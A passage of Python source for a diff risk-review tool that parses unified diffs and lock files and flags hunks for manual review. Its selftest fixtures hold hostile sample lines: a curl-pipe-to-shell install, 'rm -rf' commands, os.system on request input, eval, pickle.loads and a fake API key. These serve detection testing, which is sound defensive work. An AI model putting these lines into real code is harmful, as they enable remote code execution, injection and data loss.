def scan_signals(files: list[FileDiff]) -> list[Signal]:
    signals: list[Signal] = []
    added_norm = {ln.text.strip() for f in files for h in f.hunks for ln in h.lines if ln.kind == "+"}
    for f in files:
        cats = set(f.categories)
        ext = f.path.lower().rsplit(".", 1)[-1] if "." in f.path.split("/")[-1] else ""
        if f.binary or (cats and cats <= {"lockfile", "docs"}) or (cats and ext in DOC_EXTS | {"txt"}):
            continue            # prose and lock files are not executed; lock files are counted separately
        unknown = not f.categories
        is_test = "test" in cats or unknown

        def add(kind: str, hunk: Hunk, ln: Line, text: str | None = None) -> None:
            no = ln.new_no if ln.kind == "+" else ln.old_no
            shown = text if text is not None else redact(ln.text.strip())[:120]
            signals.append(Signal(kind, f.path, ln.kind, no, shown, hunk.header))

        for hunk, ln in not_null_hits(f):
            add("not-null-without-default", hunk, ln)
        if f.status == "deleted" and is_test:
            gone = [(h, ln) for h in f.hunks for ln in h.lines if ln.kind == "-" and ASSERT_RE.search(ln.text)]
            if gone:
                add("deleted-assertion", gone[0][0], gone[0][1],
                    f"whole test file deleted, {len(gone)} assertion line(s) with it")
            continue
        for hunk in f.hunks:
            for ln in hunk.lines:
                if ln.kind == "+":
                    found: list[str] = []
                    for kind, _side, rx, scope in RULES:
                        if kind in found or (scope == "test" and not is_test):
                            continue
                        m = rx.search(ln.text)
                        if not m:
                            continue
                        if kind == "unsafe-deserialization":
                            if m.group(0).startswith("yaml.") and "unsafe" not in m.group(0) and re.search(
                                    r"Loader\s*=\s*(yaml\.)?(C?SafeLoader|BaseLoader)", ln.text):
                                continue
                            if m.group(0).startswith("torch.load") and re.search(
                                    r"weights_only\s*=\s*True", ln.text):
                                continue
                        found.append(kind)
                        add(kind, hunk, ln)
                    if any(rx.search(ln.text) for rx in SECRET_VALUE_RES) or SECRET_ASSIGN_RE.search(ln.text):
                        add("secret-literal", hunk, ln)
                elif ln.kind == "-" and is_test and ASSERT_RE.search(ln.text):
                    if ln.text.strip() not in added_norm:
                        add("deleted-assertion", hunk, ln)
    return signals


# ----------------------------------------------------------------- lock files

def lock_format(name: str) -> str | None:
    name = name.lower()
    if name in ("package-lock.json", "npm-shrinkwrap.json", "pipfile.lock"):
        return "json"
    if name == "yarn.lock":
        return "yarn"
    if name == "pnpm-lock.yaml":
        return "pnpm"
    if name in ("poetry.lock", "uv.lock", "cargo.lock", "pdm.lock"):
        return "toml"
    if name == "composer.lock":
        return "composer"
    if name == "go.sum":
        return "gosum"
    if name == "gemfile.lock":
        return "gemfile"
    if name == "gradle.lockfile":
        return "gradle"
    return None


def json_key_name(key: str) -> str:
    if "node_modules/" in key:
        return key.rsplit("node_modules/", 1)[1]
    return key


def lock_changes(f: FileDiff) -> dict:
    """New / removed / bumped package names from the hunks of one lock file."""
    fmt = lock_format(f.path.split("/")[-1])
    result = {"path": f.path, "format": fmt, "parsed": fmt is not None and not f.binary,
              "new": [], "removed": [], "bumped": [], "lower_bound": any(not h.complete for h in f.hunks)}
    if not result["parsed"]:
        return result
    added: dict[str, set[str]] = {}
    removed: dict[str, set[str]] = {}
    context: set[str] = set()
    ver_old: dict[str, str] = {}
    ver_new: dict[str, str] = {}

    def record(kind: str, name: str, version: str | None) -> None:
        if not name:
            return
        if kind == "+":
            added.setdefault(name, set()).add(version or "")
        elif kind == "-":
            removed.setdefault(name, set()).add(version or "")
        else:
            context.add(name)

    for hunk in f.hunks:
        key_old: tuple[str, str] | None = None   # (name, kind of key line) on the old side
        key_new: tuple[str, str] | None = None
        for ln in hunk.lines:
            text = ln.text
            name = version = None
            is_key = False
            if fmt == "json":
                m = re.match(r'^\s*"([^"]*)"\s*:\s*\{\s*$', text)
                if m and m.group(1) and m.group(1) not in ("packages", "dependencies", "default", "develop",
                                                         "_meta", "requires", "devDependencies", "engines"):
                    name, is_key = json_key_name(m.group(1)), True
                mv = re.match(r'^\s*"version"\s*:\s*"=*([^"]+)"', text)
                if mv:
                    version = mv.group(1)
            elif fmt == "yarn":
                m = re.match(r'^"?((?:@[^@/\s"]+/)?[^@\s",]+)@', text)
                if m and not text.startswith((" ", "#")):
                    name, is_key = m.group(1), True
                mv = re.match(r'^\s+version:?\s+"?([^"\s]+)"?', text)
                if mv:
                    version = mv.group(1)
            elif fmt == "pnpm":
                m = re.match(r"^  '?/?((?:@[^/@\s']+/)?[^/@\s']+)[@/](\d[^:'\s(]*)(?:\([^)]*\))*'?:\s*$", text)
                if m:
                    record(ln.kind, m.group(1), m.group(2))
                continue
            elif fmt in ("toml", "composer"):
                rx = r'^name\s*=\s*"([^"]+)"' if fmt == "toml" else r'^\s*"name"\s*:\s*"([^"]+)"'
                m = re.match(rx, text)
                if m:
                    name, is_key = m.group(1), True
                rxv = r'^version\s*=\s*"([^"]+)"' if fmt == "toml" else r'^\s*"version"\s*:\s*"([^"]+)"'
                mv = re.match(rxv, text)
                if mv:
                    version = mv.group(1)
            elif fmt == "gosum":
                m = re.match(r"^(\S+)\s+(v[^\s/]+)(/go\.mod)?\s+h1:", text)
                if m:
                    record(ln.kind, m.group(1), m.group(2))
                continue
            elif fmt == "gemfile":
                m = re.match(r"^    ([A-Za-z0-9_.-]+) \(([^)]+)\)\s*$", text)
                if m:
                    record(ln.kind, m.group(1), m.group(2))
                continue
            elif fmt == "gradle":
                m = re.match(r"^([\w.-]+:[\w.-]+):([^=\s]+)=", text)
                if m:
                    record(ln.kind, m.group(1), m.group(2))
                continue
            if is_key and name:
                if ln.kind in (" ", "-"):
                    key_old = (name, ln.kind)
                if ln.kind in (" ", "+"):
                    key_new = (name, ln.kind)
                record(ln.kind, name, None)
            if version is not None:
                if ln.kind in (" ", "-") and key_old:
                    if key_old[1] == "-":
                        removed.setdefault(key_old[0], set()).add(version)
                    elif ln.kind == "-":
                        ver_old[key_old[0]] = version
                if ln.kind in (" ", "+") and key_new:
                    if key_new[1] == "+":
                        added.setdefault(key_new[0], set()).add(version)
                    elif ln.kind == "+":
                        ver_new[key_new[0]] = version
    bumped = {n for n in ver_old if n in ver_new and ver_old[n] != ver_new[n]}
    for n in set(added) & set(removed):
        if {v for v in added[n] if v} != {v for v in removed[n] if v}:
            bumped.add(n)
    result["new"] = sorted(n for n in added if n not in removed and n not in context)
    result["removed"] = sorted(n for n in removed if n not in added and n not in context)
    result["bumped"] = sorted(bumped)
    return result


# ----------------------------------------------------------------- analysis

def analyse(text: str, source: str = "<stdin>") -> dict:
    parser = Parser(text)
    parser.run()
    files = [f for f in parser.files if f.hunks or f.binary or f.has_minus_plus or f.rename_from
             or f.copy_from or f.old_mode or f.new_file_mode or f.deleted_file_mode or f.combined]
    if not files:
        hint = ""
        if parser.stat_lines:
            hint = (" The input looks like --stat / --numstat output; paste the patch itself "
                    "(git diff, git show -p, diff -u).")
        elif parser.context_diff:
            hint = " The input looks like a context diff (diff -c); produce a unified diff with diff -u."
        raise InputError(
            "no unified diff found: expected 'diff --git', a '--- ' / '+++ ' header pair or '@@' hunk "
            "headers." + hint + " With only before/after snippets, skip the script and write "
            "'Diff stats: not computed (no unified diff)'."
        )
    finish_paths(files)
    for f in files:
        cats = set()
        for p in (f.new_path, f.old_path):
            if p:
                cats.update(classify(p))
        if not f.new_path and not f.old_path:
            cats = set()
        if len(cats) > 1:                 # fallback labels give way to a real category
            cats -= {"code", "data"}
            if cats - {"docs"}:
                cats.discard("docs")
        f.categories = [c for c in CATEGORY_ORDER if c in cats]

    warnings = list(parser.warnings)
    for f in files:
        for h in f.hunks:
            if not h.complete:
                warnings.append(
                    f"{f.path} {h.header}: hunk ends early ({h.missing[0]} old / {h.missing[1]} new lines "
                    "missing); the diff looks truncated or edited, so every count is a lower bound")
    notes: list[str] = []
    if parser.trimmed_blank:
        notes.append(f"{parser.trimmed_blank} blank line(s) inside hunks had lost their leading space "
                     "(common after pasting); counted as context lines")
    if parser.commits > 1:
        notes.append(f"input contains {parser.commits} commits; stats are summed over all of them")
    combined = [f.path for f in files if f.combined]
    if combined:
        warnings.append("combined (merge) diff not analysed hunk by hunk: " + ", ".join(combined))
    loose = sum(1 for f in files for h in f.hunks if h.old_start is None)
    if loose:
        notes.append(f"{loose} hunk(s) had no line numbers ('@@' without ranges); parsed line by line, "
                     "signals carry no line numbers")

    totals = {
        "files": len(files),
        "modified": sum(f.status == "modified" for f in files),
        "added": sum(f.status == "added" for f in files),
        "deleted": sum(f.status == "deleted" for f in files),
        "renamed": sum(f.status == "renamed" for f in files),
        "copied": sum(f.status == "copied" for f in files),
        "binary": sum(f.binary for f in files),
        "mode_changes": sum(1 for f in files if f.old_mode and f.new_mode and f.old_mode != f.new_mode),
        "additions": sum(f.additions for f in files),
        "deletions": sum(f.deletions for f in files),
    }
    totals["changed_lines"] = totals["additions"] + totals["deletions"]
    non_lock = [f for f in files if "lockfile" not in f.categories]
    totals["changed_lines_excl_lockfiles"] = sum(f.additions + f.deletions for f in non_lock)
    totals["test_lines"] = sum(f.additions + f.deletions for f in files if "test" in f.categories)
    totals["production_code_lines"] = sum(
        f.additions + f.deletions for f in files
        if "test" not in f.categories and "lockfile" not in f.categories and is_code_file(f))

    for f in files:
        if f.binary:
            notes.append(f"binary file {f.path}: contents not shown in the diff; review it outside the diff")
        if f.new_file_mode == "100755" or (f.new_mode == "100755" and f.old_mode != "100755"):
            notes.append(f"{f.path} is now executable")
        for mode in (f.new_mode, f.new_file_mode):
            if mode == "120000":
                notes.append(f"{f.path} is a symlink; check where it points")
            elif mode == "160000":
                notes.append(f"{f.path} is a submodule pointer; the change is in another repository")

    boundaries: dict[str, list[str]] = {}
    for f in files:
        for c in f.categories:
            if c not in ("code", "docs"):
                boundaries.setdefault(c, []).append(f.path)

    lockfiles = [lock_changes(f) for f in files if "lockfile" in f.categories]
    signals = scan_signals(files)

    # thresholds
    n_files = totals["files"]
    lines_thr = totals["changed_lines_excl_lockfiles"]
    boundary_files = sorted({p for c in MANUAL_BOUNDARIES for p in boundaries.get(c, [])})
    new_pkgs = sum(len(lk["new"]) for lk in lockfiles)
    unparsed_locks = [lk["path"] for lk in lockfiles if not lk["parsed"]]
    prod, tst = totals["production_code_lines"], totals["test_lines"]
    thresholds = [
        {"rule": f"files changed >= {FILES_MANUAL}", "value": n_files,
         "tripped": n_files >= FILES_MANUAL, "effect": "manual pass"},
        {"rule": f"files changed {FILES_SCOPE_CHECK}-{FILES_MANUAL - 1}: check for scope creep", "value": n_files,
         "tripped": FILES_SCOPE_CHECK <= n_files < FILES_MANUAL, "effect": "note"},
        {"rule": f"changed lines >= {LINES_MANUAL} (additions + deletions, lock files excluded)",
         "value": lines_thr, "tripped": lines_thr >= LINES_MANUAL, "effect": "manual pass"},
        {"rule": "boundary files touched (" + ", ".join(MANUAL_BOUNDARIES) + ")", "value": len(boundary_files),
         "tripped": bool(boundary_files), "effect": "manual pass"},
        {"rule": "lock files adding packages, or in a format this script cannot count",
         "value": new_pkgs + len(unparsed_locks), "tripped": bool(new_pkgs or unparsed_locks),
         "effect": "manual pass"},
        {"rule": "hunk signals", "value": len(signals), "tripped": bool(signals), "effect": "manual pass"},
        {"rule": f"production code >= {TESTS_PROD_MIN} lines while test lines < {int(TESTS_RATIO * 100)}% "
                 "of it: ask why", "value": f"{prod}/{tst}",
         "tripped": prod >= TESTS_PROD_MIN and tst < TESTS_RATIO * prod, "effect": "note"},
    ]
    reasons = [t["rule"] for t in thresholds if t["tripped"] and t["effect"] == "manual pass"]

    # hunks a person has to read one by one
    size_trip = n_files >= FILES_MANUAL or lines_thr >= LINES_MANUAL
    must_read: list[dict] = []
    seen: set[tuple[str, str]] = set()

    def want(path: str, header: str, why: str) -> None:
        key = (path, header)
        for item in must_read:
            if (item["path"], item["hunk"]) == key and why not in item["why"]:
                item["why"].append(why)
        if key not in seen:
            seen.add(key)
            must_read.append({"path": path, "hunk": header, "why": [why]})

    for s in signals:
        want(s.path, s.hunk, s.kind)
    for f in files:
        hit = [c for c in f.categories if c in MANUAL_BOUNDARIES]
        lock_hit = "lockfile" in f.categories and (f.path in unparsed_locks or any(
            lk["path"] == f.path and lk["new"] for lk in lockfiles))
        for h in f.hunks:
            if hit:
                want(f.path, h.header, "/".join(hit))
            if lock_hit:
                want(f.path, h.header, "lockfile")
        if (hit or lock_hit) and not f.hunks:
            want(f.path, "(no hunks: binary, rename or mode change)", "/".join(hit) or "lockfile")
    total_hunks = sum(len(f.hunks) for f in files)

    return {
        "source": source,
        "commits": parser.commits,
        "totals": totals,
        "files": [
            {"path": f.path, "old_path": f.old_path if f.old_path != f.new_path else None,
             "status": f.status, "additions": f.additions, "deletions": f.deletions, "binary": f.binary,
             "old_mode": f.old_mode, "new_mode": f.new_mode or f.new_file_mode,
             "similarity": f.similarity, "categories": f.categories,
             "hunks": [h.header for h in f.hunks]}
            for f in files
        ],
        "boundaries": {c: boundaries[c] for c in CATEGORY_ORDER if c in boundaries},
        "lockfiles": lockfiles,
        "signals": [s.__dict__ for s in signals],
        "thresholds": thresholds,
        "manual_pass": {
            "required": bool(reasons),
            "reasons": reasons,
            "all_hunks": size_trip,
            "total_hunks": total_hunks,
            "hunks": must_read,
        },
        "notes": notes,
        "warnings": warnings,
    }


# ----------------------------------------------------------------- output

def render(report: dict) -> str:
    t = report["totals"]
    out: list[str] = []
    w = out.append
    w(f"Diff stats (diff_risk.py, input: {report['source']})")
    w(f"  Files changed: {t['files']} (modified {t['modified']}, added {t['added']}, deleted {t['deleted']}, "
      f"renamed {t['renamed']}, copied {t['copied']}, binary {t['binary']}, mode changes {t['mode_changes']})")
    lock_lines = t["changed_lines"] - t["changed_lines_excl_lockfiles"]
    extra = f"; lock files {lock_lines}, not counted toward the {LINES_MANUAL}-line threshold" if lock_lines else ""
    w(f"  Lines: +{t['additions']} / -{t['deletions']} = {t['changed_lines']} changed{extra}")
    w(f"  Production code lines changed: {t['production_code_lines']}; test lines changed: {t['test_lines']}")
    w("")
    w("Files")
    shown = report["files"][:60]
    width = min(max((len(f["path"]) for f in shown), default=10), 70)
    for f in shown:
        status = "" if f["status"] == "modified" else f" ({f['status']}" + (
            f" from {f['old_path']}" if f["status"] in ("renamed", "copied") and f["old_path"] else "") + ")"
        mode = ""
        if f["old_mode"] and f["new_mode"] and f["old_mode"] != f["new_mode"]:
            mode = f" mode {f['old_mode']}->{f['new_mode']}"
        elif f["status"] == "added" and f["new_mode"] and f["new_mode"] != "100644":
            mode = f" mode {f['new_mode']}"
        counts = "   binary   " if f["binary"] else f"{'+' + str(f['additions']):>6} {'-' + str(f['deletions']):>6}"
        w(f"  {counts}  {f['path']:<{width}}  [{', '.join(f['categories']) or '?'}]{status}{mode}")
    if len(report["files"]) > len(shown):
        w(f"  ... {len(report['files']) - len(shown)} more file(s); use --json for the full list")
    w("")
    w("Boundaries touched")
    touched = {c: p for c, p in report["boundaries"].items() if c != "test"}
    if touched:
        for c, paths in touched.items():
            more = f" (+{len(paths) - 6} more)" if len(paths) > 6 else ""
            w(f"  {c:<10} {', '.join(paths[:6])}{more}")
    else:
        w("  none (only ordinary code, tests or docs)")
    if "test" in report["boundaries"]:
        w(f"  {'test':<10} {len(report['boundaries']['test'])} file(s)")
    if report["lockfiles"]:
        w("")
        w("Lock files")
        for lk in report["lockfiles"]:
            if not lk["parsed"]:
                w(f"  {lk['path']}: format not parsed; count new packages by hand")
                continue
            names = ", ".join(lk["new"][:12]) + (" ..." if len(lk["new"]) > 12 else "")
            bound = " (at least; some hunks are cut off)" if lk["lower_bound"] else ""
            w(f"  {lk['path']}: {len(lk['new'])} new package(s){': ' + names if names else ''}; "
              f"{len(lk['bumped'])} bumped; {len(lk['removed'])} removed{bound}")
    w("")
    w(f"Hunk signals ({len(report['signals'])})")
    if not report["signals"]:
        w("  none")
    for s in report["signals"][:80]:
        where = f"{s['path']}:{s['side']}{s['line_no']}" if s["line_no"] is not None else f"{s['path']}:{s['side']}"
        w(f"  {where}  {s['kind']}  {s['text']}")
    if len(report["signals"]) > 80:
        w(f"  ... {len(report['signals']) - 80} more; use --json")
    kinds = sorted({s["kind"] for s in report["signals"]})
    for k in kinds:
        w(f"    {k}: {SIGNAL_TEXT[k]}")
    w("")
    w("Thresholds applied (result, value, rule)")
    for th in report["thresholds"]:
        result = ("MANUAL PASS" if th["effect"] == "manual pass" else "NOTE") if th["tripped"] else "ok"
        w(f"  {result:<11}  {str(th['value']):>7}  {th['rule']}")
    w("")
    mp = report["manual_pass"]
    if mp["required"]:
        w("Manual hunk-by-hunk pass: REQUIRED")
        for r in mp["reasons"]:
            w(f"  because: {r}")
        if mp["all_hunks"]:
            w(f"  Size threshold crossed: a person reads all {mp['total_hunks']} hunk(s). Start with these:")
        else:
            w("  A person reads these hunks one by one:")
        for item in mp["hunks"][:60]:
            w(f"    {item['path']} {item['hunk']}  ({', '.join(item['why'])})")
        if len(mp["hunks"]) > 60:
            w(f"    ... {len(mp['hunks']) - 60} more; use --json")
    else:
        w("Manual hunk-by-hunk pass: not required by the thresholds (the four-step review still applies)")
    for n in report["notes"]:
        w(f"NOTE: {n}")
    for n in report["warnings"]:
        w(f"WARN: {n}")
    return "\n".join(out)


def read_input(path: str | None) -> tuple[str, str]:
    if path in (None, "-"):
        if sys.stdin is None or (path is None and sys.stdin.isatty()):
            raise InputError("no input: pass a diff file, or pipe a diff into stdin (use '-' to read stdin)")
        data = sys.stdin.buffer.read() if hasattr(sys.stdin, "buffer") else sys.stdin.read().encode()
        return data.decode("utf-8", errors="replace"), "<stdin>"
    p = Path(path)
    if p.is_dir():
        raise InputError(f"{path} is a directory; pass a diff file (for example: git diff > change.diff)")
    try:
        data = p.read_bytes()
    except FileNotFoundError:
        raise InputError(f"file not found: {path}") from None
    except OSError as exc:
        raise InputError(f"cannot read {path}: {exc.strerror or exc}") from None
    return data.decode("utf-8", errors="replace"), path


def main(argv: list[str] | None = None) -> int:
    ap = argparse.ArgumentParser(
        prog="diff_risk.py",
        description="Objective stats and risk signals for a unified diff: files, lines, renames, mode "
                    "changes, boundary paths, hunk signals, new lock-file packages, and whether a manual "
                    "hunk-by-hunk pass is required. Works on pasted text; Git is not needed.",
        epilog=f"Thresholds: {FILES_MANUAL}+ files or {LINES_MANUAL}+ changed lines (lock files excluded), "
               f"any {'/'.join(MANUAL_BOUNDARIES)} file, lock files adding packages, or any hunk signal "
               f"-> manual pass. {FILES_SCOPE_CHECK}-{FILES_MANUAL - 1} files and thin test changes are notes. "
               "Exit codes: 0 no manual pass required, 1 manual pass required, 2 input error.",
    )
    ap.add_argument("diff", nargs="?", help="file with the diff; '-' or nothing reads stdin")
    ap.add_argument("--json", action="store_true", help="print the report as JSON")
    ap.add_argument("--selftest", action="store_true", help="run the built-in regression cases and exit")
    args = ap.parse_args(argv)
    if args.selftest:
        return selftest()
    try:
        text, source = read_input(args.diff)
        report = analyse(text, source)
    except InputError as exc:
        print(f"ERROR: {exc}", file=sys.stderr)
        return 2
    print(json.dumps(report, ensure_ascii=False, indent=2) if args.json else render(report))
    return 1 if report["manual_pass"]["required"] else 0


# ----------------------------------------------------------------- selftest

SELFTEST_CASES: list[tuple[str, str]] = []


def _case(name: str, text: str) -> str:
    SELFTEST_CASES.append((name, text))
    return text


NORMAL = _case("normal", """\
diff --git a/src/pricing.py b/src/pricing.py
index 1111111..2222222 100644
--- a/src/pricing.py
+++ b/src/pricing.py
@@ -10,3 +10,4 @@ def discount(price, tier):
     if tier == "gold":
-        return price * 0.8
+        rate = 0.8
+        return round(price * rate, 2)
     return price
diff --git a/tests/test_pricing.py b/tests/test_pricing.py
index 3333333..4444444 100644
--- a/tests/test_pricing.py
+++ b/tests/test_pricing.py
@@ -1,2 +1,4 @@
 def test_gold():
     assert discount(100, "gold") == 80
+
+    assert discount(9.99, "gold") == 7.99
""")

MIGRATION = _case("migration", """\
diff --git a/db/migrations/0042_add_age.sql b/db/migrations/0042_add_age.sql
new file mode 100644
index 0000000..5555555
--- /dev/null
+++ b/db/migrations/0042_add_age.sql
@@ -0,0 +1,12 @@
+-- add age; NOT NULL in a comment must not count
+ALTER TABLE users ADD COLUMN age integer NOT NULL;
+ALTER TABLE users ADD COLUMN score integer NOT NULL DEFAULT 0;
+SELECT id FROM users WHERE email IS NOT NULL;
+CREATE TABLE audit_log (
+    id bigserial PRIMARY KEY,
+    actor text NOT NULL,
+    created_at timestamptz NOT NULL
+);
+ALTER TABLE orders
+    ALTER COLUMN status SET NOT NULL;
+DROP TABLE legacy_orders;
diff --git a/db/schema.sql b/db/schema.sql
index 6666666..7777777 100644
--- a/db/schema.sql
+++ b/db/schema.sql
@@ -20,5 +20,6 @@ CREATE TABLE users (
     id bigserial PRIMARY KEY,
     email text NOT NULL,
--- removed SQL comment: '---' followed by '+++' looks like a file header
+++ added line starting with '++'
+    nickname text NOT NULL,
     created_at timestamptz NOT NULL
 );
""")

DANGER = _case("danger", """\
diff --git a/tools/cleanup.py b/tools/cleanup.py
index 8888888..9999999 100644
--- a/tools/cleanup.py
+++ b/tools/cleanup.py
@@ -1 +1,12 @@
 import subprocess
+import pickle, yaml
+API_KEY = "sk-proj-abcdefghijklmnopqrstuvwx"
+def run(target, expr, blob, f):
+    subprocess.run(f"rm -rf {target}", shell=True)
+    value = eval(expr)
+    data = pickle.loads(blob)
+    safe = yaml.load(f, Loader=yaml.SafeLoader)
+    also_safe = yaml.safe_load(f)
+    match = pattern.exec(text)
+    os.chmod(target, 0o777)
+    return value, data, safe, also_safe, match
""")

RENAME = _case("rename-mode", """\
diff --git a/lib/old_name.py b/lib/new_name.py
similarity index 100%
rename from lib/old_name.py
rename to lib/new_name.py
diff --git a/scripts/deploy.sh b/scripts/deploy.sh
old mode 100644
new mode 100755
diff --git a/bin/tool b/bin/tool
new file mode 100755
index 0000000..abcdef0
--- /dev/null
+++ b/bin/tool
@@ -0,0 +1,2 @@
+#!/bin/sh
+echo hi
diff --git a/assets/logo.png b/assets/logo.png
index 1234567..89abcde 100644
Binary files a/assets/logo.png and b/assets/logo.png differ
""")

ASSERTS = _case("deleted-assertions", """\
diff --git a/tests/test_login.py b/tests/test_login.py
index 1111111..2222222 100644
--- a/tests/test_login.py
+++ b/tests/test_login.py
@@ -5,7 +5,7 @@ def test_rejects_bad_password(client):
     resp = client.post("/login", data={"user": "a", "pw": "wrong"})
-    assert resp.status_code == 401
-    assert "invalid" in resp.text
+    assert "invalid" in resp.text
     resp = client.post("/login", data={"user": "a", "pw": "right"})
-    self.assertEqual(resp.status_code, 200)
+    pass
+@pytest.mark.skip(reason="flaky")
 def test_lockout():
     ...
""")

LOCKS = _case("lockfiles", """\
diff --git a/package-lock.json b/package-lock.json
index 1111111..2222222 100644
--- a/package-lock.json
+++ b/package-lock.json
@@ -40,5 +40,9 @@
     "node_modules/lodash": {
-      "version": "4.17.20",
-      "resolved": "https://registry.npmjs.org/lodash/-/lodash-4.17.20.tgz"
+      "version": "4.17.21",
+      "resolved": "https://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz"
     },
+    "node_modules/left-pad": {
+      "version": "1.3.0",
+      "resolved": "https://registry.npmjs.org/left-pad/-/left-pad-1.3.0.tgz"
+    },
     "node_modules/zod": {
diff --git a/yarn.lock b/yarn.lock
index 3333333..4444444 100644
--- a/yarn.lock
+++ b/yarn.lock
@@ -10,3 +10,7 @@
 "@babel/core@^7.0.0":
   version "7.24.0"

+is-odd@^3.0.1:
+  version "3.0.1"
+  resolved "https://registry.yarnpkg.com/is-odd/-/is-odd-3.0.1.tgz"
+
diff --git a/poetry.lock b/poetry.lock
index 5555555..6666666 100644
--- a/poetry.lock
+++ b/poetry.lock
@@ -1,5 +1,10 @@
 [[package]]
 name = "requests"
-version = "2.31.0"
+version = "2.32.3"
 description = "HTTP for Humans."
+
+[[package]]
+name = "requests-oauth3"
+version = "0.0.1"
+description = "unknown"

diff --git a/go.sum b/go.sum
index 7777777..8888888 100644
--- a/go.sum
+++ b/go.sum
@@ -1,2 +1,4 @@
 github.com/pkg/errors v0.9.1 h1:abc=
 github.com/pkg/errors v0.9.1/go.mod h1:def=
+github.com/evil/thing v1.0.0 h1:ghi=
+github.com/evil/thing v1.0.0/go.mod h1:jkl=
diff --git a/Podfile.lock b/Podfile.lock
index 9999999..aaaaaaa 100644
--- a/Podfile.lock
+++ b/Podfile.lock
@@ -1,1 +1,2 @@
 PODS:
+  - Alamofire (5.8.0)
""")

LOCKS2 = _case("lockfiles-2", """\
diff --git a/pnpm-lock.yaml b/pnpm-lock.yaml
--- a/pnpm-lock.yaml
+++ b/pnpm-lock.yaml
@@ -10,4 +10,7 @@ packages:
-  /lodash@4.17.20:
+  /lodash@4.17.21:
     resolution: {integrity: sha512-abc}
     dev: false
+  '@scope/new-pkg@1.0.0':
+    resolution: {integrity: sha512-def}
+  is-number@7.0.0(typescript@5.0.0):
     engines: {node: '>=0.12.0'}
diff --git a/Gemfile.lock b/Gemfile.lock
--- a/Gemfile.lock
+++ b/Gemfile.lock
@@ -3,4 +3,5 @@ GEM
   specs:
-    rack (2.2.7)
+    rack (2.2.8)
+    sneaky (0.1.0)
       rack (>= 2.0)
     rails (7.1.0)
diff --git a/composer.lock b/composer.lock
--- a/composer.lock
+++ b/composer.lock
@@ -5,5 +5,9 @@
         {
             "name": "monolog/monolog",
-            "version": "3.4.0",
+            "version": "3.5.0",
         },
+        {
+            "name": "evil/pkg",
+            "version": "1.0.0",
+        },
         {
diff --git a/gradle.lockfile b/gradle.lockfile
--- a/gradle.lockfile
+++ b/gradle.lockfile
@@ -1,2 +1,3 @@
-com.google.guava:guava:32.0.0-jre=compileClasspath
+com.google.guava:guava:33.0.0-jre=compileClasspath
+org.evil:thing:1.0=runtimeClasspath
 org.slf4j:slf4j-api:2.0.9=compileClasspath
diff --git a/Pipfile.lock b/Pipfile.lock
--- a/Pipfile.lock
+++ b/Pipfile.lock
@@ -20,7 +20,13 @@
         "certifi": {
             "hashes": [
                 "sha256:abc"
             ],
-            "version": "==2023.7.22"
+            "version": "==2024.2.2"
         },
+        "requests-oauth3": {
+            "hashes": [
+                "sha256:def"
+            ],
+            "version": "==0.0.1"
+        },
         "idna": {
diff --git a/Cargo.lock b/Cargo.lock
--- a/Cargo.lock
+++ b/Cargo.lock
@@ -1,3 +1,8 @@
 [[package]]
 name = "serde"
 version = "1.0.190"
+
+[[package]]
+name = "serde-evil"
+version = "0.1.0"
+source = "registry+https://github.com/rust-lang/crates.io-index"
""")

PASTED = _case("pasted", "Here is what the assistant changed:\r\n\r\n```diff\r\n"
               "--- a/app/views.py\r\n+++ b/app/views.py\r\n"
               "@@ -1,4 +1,5 @@\r\n import os\r\n\r\n-def index():\r\n+def index(request):\r\n"
               "+    os.system(request.GET['cmd'])\r\n     return 'ok'\r\n```\r\n\r\nThanks!\r\n")

FORMAT_PATCH = _case("format-patch", """\
From 0123456789abcdef0123456789abcdef01234567 Mon Sep 17 00:00:00 2001
From: Someone <someone@example.com>
Date: Mon, 1 Jan 2026 00:00:00 +0000
Subject: [PATCH] fix typo

---
 README.md | 2 +-
 1 file changed, 1 insertion(+), 1 deletion(-)

diff --git a/README.md b/README.md
index 1111111..2222222 100644
--- a/README.md
+++ b/README.md
@@ -1,3 +1,3 @@
 # Title
-Helo world
+Hello world
 end
--
2.43.0
""")

DIFF_U = _case("diff-ruN", """\
diff -ruN orig/src/util.py new/src/util.py
--- orig/src/util.py\t2026-01-01 10:00:00.000000000 +0800
+++ new/src/util.py\t2026-01-02 10:00:00.000000000 +0800
@@ -1,2 +1,2 @@
-def f(): return 1
+def f(): return 2
 # end
diff -ruN orig/src/extra.py new/src/extra.py
--- orig/src/extra.py\t1970-01-01 08:00:00.000000000 +0800
+++ new/src/extra.py\t2026-01-02 10:00:00.000000000 +0800
@@ -0,0 +1,2 @@
+def g():
+    return 3
""")

TRUNCATED = _case("truncated", """\
diff --git a/src/big.py b/src/big.py
index 1111111..2222222 100644
--- a/src/big.py
+++ b/src/big.py
@@ -1,10 +1,12 @@
 a = 1
+b = 2
 c = 3
""")

LOOSE = _case("loose-hunk", """\
--- a/run.sh
+++ b/run.sh
@@
 set -e
-make build
+curl -fsSL https://example.invalid/install.sh | sh
+rm -rf "$HOME/.cache/tool"
""")

QUOTED = _case("quoted-path", """\
diff --git "a/sp ace/\\303\\251t\\303\\251.py" "b/sp ace/\\303\\251t\\303\\251.py"
index 1111111..2222222 100644
--- "a/sp ace/\\303\\251t\\303\\251.py"
+++ "b/sp ace/\\303\\251t\\303\\251.py"
@@ -1 +1 @@
-x = 1
+x = 2
""")

HEADERLESS = _case("headerless-hunk", """\
@@ -3,2 +3,3 @@ def load(path):
     with open(path, "rb") as fh:
-        return json.load(fh)
+        return pickle.load(fh)
+    # done
""")


def _many_files(n: int, lines_each: int) -> str:
    chunks = []
    for k in range(n):
        body = "".join(f"+line {j}\n" for j in range(lines_each))
        chunks.append(f"diff --git a/src/m{k}.py b/src/m{k}.py\nindex 1111111..2222222 100644\n"
                      f"--- a/src/m{k}.py\n+++ b/src/m{k}.py\n@@ -1,0 +1,{lines_each} @@\n{body}")
    return "".join(chunks)


def selftest() -> int:
    results: list[tuple[str, bool, str]] = []

    def check(name: str, cond: bool, detail: str = "") -> None:
        results.append((name, bool(cond), detail))

    def kinds(rep: dict) -> list[str]:
        return [s["kind"] for s in rep["signals"]]

    for name, text in SELFTEST_CASES:
        if name not in ("truncated", "headerless-hunk"):
            warned = analyse(text)["warnings"]
            check(f"{name}: well-formed fixture parses without warnings", not warned, str(warned))

    r = analyse(NORMAL)
    check("normal: 2 files, +4/-1", r["totals"]["files"] == 2 and r["totals"]["additions"] == 4
          and r["totals"]["deletions"] == 1, str(r["totals"]))
    check("normal: no signals, no manual pass", not r["signals"] and not r["manual_pass"]["required"],
          str(r["signals"]) + str(r["manual_pass"]["reasons"]))
    check("normal: categories code/test",
